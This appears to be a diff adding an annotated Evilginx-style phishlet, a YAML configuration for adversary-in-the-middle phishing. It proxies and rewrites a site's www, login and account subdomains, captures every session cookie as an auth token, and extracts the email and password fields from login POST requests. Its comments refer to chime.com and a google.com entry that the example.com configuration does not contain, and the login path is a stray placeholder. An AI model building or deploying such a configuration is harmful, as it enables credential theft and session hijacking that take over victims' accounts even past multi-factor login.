@@ -1,0 +1,64 @@
+name: 'Your First Phishlet'
+author: 'IMPERATOR'
+min_ver: '3.2.0'
+# proxy_hosts: This is a list of configurations for each proxy host.
+# Each configuration is a dictionary with the following keys:
+# 
+# - phish_sub: This is the subdomain that will be used for phishing. For example, if phish_sub is 'www', the phishing URL will be 'www.chime.com'.
+# 
+# - orig_sub: This is the original subdomain that the phishing subdomain is impersonating. For example, if orig_sub is 'member', the original URL is 'member.chime.com'.
+# 
+# - domain: This is the main domain of the URL. In the first three entries, the domain is 'chime.com'. In the last entry, the domain is 'google.com'.
+# 
+# - session: This is a boolean value that indicates whether session tracking is enabled for this proxy host. If it's true, the proxy will keep track of user sessions.
+# 
+# - is_landing: This is a boolean value that indicates whether this proxy host is a landing page. If it's true, the proxy will treat this host as a landing page.
+# 
+# - auto_filter: This is a boolean value that indicates whether automatic filtering is enabled for this proxy host. If it's true, the proxy will automatically filter out requests that don't match the original host.
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'example.com', session: true, is_landing: false, auto_filter: true}
+
+# - triggers_on: This is the domain that triggers the proxy. When a request is made to this domain, the proxy will activate.
+# 
+# - orig_sub: This is the original subdomain that the proxy is impersonating. In this case, it's an empty string, which means the proxy is impersonating the main domain.
+# 
+# - domain: This is the main domain of the URL. In this case, it's 'chime.com'.
+# 
+# - search: This is the string that the proxy will search for in the response body. When it finds this string, it will replace it with the string specified in the 'replace' field.
+# 
+# - replace: This is the string that the 'search' string will be replaced with. In this case, it's '{domain}', which is a placeholder that will be replaced with the actual domain of the request.
+# 
+# - mimes: This is a list of MIME types that the proxy will apply the search and replace operation to. In this case, it's 'text/html', 'text/javascript', and 'application/json'. This means the proxy will only search and replace in responses with these MIME types.
+sub_filters:
+  - {triggers_on: 'example.com', orig_sub: '', domain: 'example.com', search: 'example.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'www.example.com', orig_sub: 'www', domain: 'example.com', search: 'www.example.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'login.example.com', orig_sub: 'login', domain: 'example.com', search: 'login.example.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'account.example.com', orig_sub: 'account', domain: 'example.com', search: 'account.example.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+
+auth_tokens:  # This is a list of domains for which authentication tokens will be tracked.
+  - domain: '.example.com'  # This is the main domain for which authentication tokens will be tracked.
+    keys: ['.*,regexp']  # This is a regular expression that matches the keys of the authentication tokens to be tracked.
+  - domain: 'account.example.com'  # This is a subdomain for which authentication tokens will be tracked.
+    keys: ['.*, regexp']  # This is a regular expression that matches the keys of the authentication tokens to be tracked.
+credentials:  # This is a dictionary that specifies how to extract the username and password from a POST request.
+  username:  # This is the key for the username in the POST request.
+    key: 'user_email'  # This is the name of the form field that contains the username.
+    search: '(.*)'  # This is a regular expression that matches the username in the form field.
+    type: 'post'  # This indicates that the username is extracted from a POST request.
+  password:  # This is the key for the password in the POST request.
+    key: 'user_password'  # This is the name of the form field that contains the password.
+    search: '(.*)'  # This is a regular expression that matches the password in the form field.
+    type: 'post'  # This indicates that the password is extracted from a POST request.
+  ##custom:
+    #- key: 'fkey'
+    #  search: '(.*)'
+    #  type: 'post'
+auth_urls:
+  - '/'
+  - '/users/sign_in'
+login:  # This is a dictionary that specifies the configuration for the login page.
+  domain: 'login.example.com'  # This is the full domain of the login page. It includes both the subdomain 'login' and the main domain 'example.com'. This is the URL that the user will be directed to when they want to log in.
+  path: '/ce vine dupa /'  # This is the path that comes after the domain in the login URL. For example, if the full login URL is 'https://login.example.com/ce vine dupa /', then the path is '/ce vine dupa /'. This is the specific page on the 'login.example.com' domain that the user will be directed to for logging in.
+
